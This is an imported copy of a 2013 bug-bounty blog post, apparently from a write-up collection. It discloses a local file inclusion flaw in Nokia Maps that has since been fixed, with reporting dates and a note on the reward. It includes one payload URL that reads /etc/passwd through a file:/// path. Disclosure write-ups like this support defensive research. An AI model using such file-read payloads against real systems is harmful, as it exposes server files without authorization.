---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2013-10-22_lfi-in-nokia-maps.md
original_filename: 2013-10-22_lfi-in-nokia-maps.md
title: LFI in Nokia maps
category: documents
detected_topics:
- path-traversal
- command-injection
tags:
- imported
- documents
- path-traversal
- command-injection
language: en
raw_sha256: b70f6b6b05ef796e10cb5a54dcc5cbef4ccfc4259d772f3750f91fcd154e3278
text_sha256: 1fc63dbc5e378b62c6c7b469a5e4f31e18ad9638ddb449be040e98bd7e903a4f
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# LFI in Nokia maps

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2013-10-22_lfi-in-nokia-maps.md
- Source Type: markdown
- Detected Topics: path-traversal, command-injection
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `b70f6b6b05ef796e10cb5a54dcc5cbef4ccfc4259d772f3750f91fcd154e3278`
- Text SHA256: `1fc63dbc5e378b62c6c7b469a5e4f31e18ad9638ddb449be040e98bd7e903a4f`


## Content

---
title: "LFI in Nokia maps"
page_title: "Shashank's Security Blog: LFI in Nokia maps"
url: "http://blog.shashank.co/2013/10/lfi-in-nokia-maps.html"
final_url: "https://blog.shashank.co/2013/10/lfi-in-nokia-maps.html"
authors: ["Shashank (@cyberboyIndia)"]
programs: ["Nokia"]
bugs: ["LFI"]
publication_date: "2013-10-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6392
---

Well, this is my first blog-post, and I am going to share a Local File inclusion bug which I spotted in Nokia maps.  
  
**http://maps.nokia.com/services/file:///etc/passwd**  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVlJu4UQrBuomi_4OapwhvdHlFDa-h9t-WLq8G1AabQWAmr9m2qPA3intnOAY2WNHZSAibW2RcdcM49DTl3gZHiUzDPBptVuvhMJMD8rb0PQAS_ZiwV9_X0fm_HBc4852xw8kTdV7Tosbw/s400/nokiaLFI.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVlJu4UQrBuomi_4OapwhvdHlFDa-h9t-WLq8G1AabQWAmr9m2qPA3intnOAY2WNHZSAibW2RcdcM49DTl3gZHiUzDPBptVuvhMJMD8rb0PQAS_ZiwV9_X0fm_HBc4852xw8kTdV7Tosbw/s1600/nokiaLFI.jpg)

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
reported on 2nd JAN 2013  
Nokia fixes it on 20th JAN 2013  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgD0DcTVDT9Wo5ezbcYPN5K_9IDeDVYbTYMzQpeVJjVTpa632sv3o8DCAq3mWuxt7X7wQCKu1Jr4dNrkH2L0Hgk3L3WHIF6wXrXbBhsiLYF5JRVwaFKm66wC_N-ZtapZ4i91l24IIr0SfJM/s400/nokia.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgD0DcTVDT9Wo5ezbcYPN5K_9IDeDVYbTYMzQpeVJjVTpa632sv3o8DCAq3mWuxt7X7wQCKu1Jr4dNrkH2L0Hgk3L3WHIF6wXrXbBhsiLYF5JRVwaFKm66wC_N-ZtapZ4i91l24IIr0SfJM/s1600/nokia.PNG)

  
  
  
  
  
  
  
  
And I received an awesome RED NOKIA LUMIA 920 :)
